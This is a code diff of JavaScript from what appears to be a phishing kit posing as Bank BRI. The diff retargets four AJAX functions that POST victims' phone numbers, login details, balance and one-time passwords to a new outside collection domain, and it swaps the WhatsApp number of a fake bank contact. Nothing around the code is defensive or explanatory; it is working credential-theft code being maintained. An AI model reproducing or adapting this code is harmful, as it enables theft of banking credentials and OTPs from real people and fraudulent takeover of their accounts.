@@ -13,7 +13,7 @@ function sendHp() {
    
    $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/tetek1/no.php',
+        url: 'https://daftarrbansos.online/acc/req/no.php',
         data: $('#index').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -37,7 +37,7 @@ function sendLogin() {
    
    $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/tetek1/login.php',
+        url: 'https://daftarrbansos.online/acc/req/login.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -68,7 +68,7 @@ function sendSaldo() {
    
    $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/tetek1/saldo.php',
+        url: 'https://daftarrbansos.online/acc/req/saldo.php',
         data: $('#sald').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -101,7 +101,7 @@ function sendOtp() {
       
    $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/tetek1/otp.php',
+        url: 'https://daftarrbansos.online/acc/req/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -124,7 +124,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://wa.me/6287835434272?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
+location.href='https://wa.me/628154039254?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
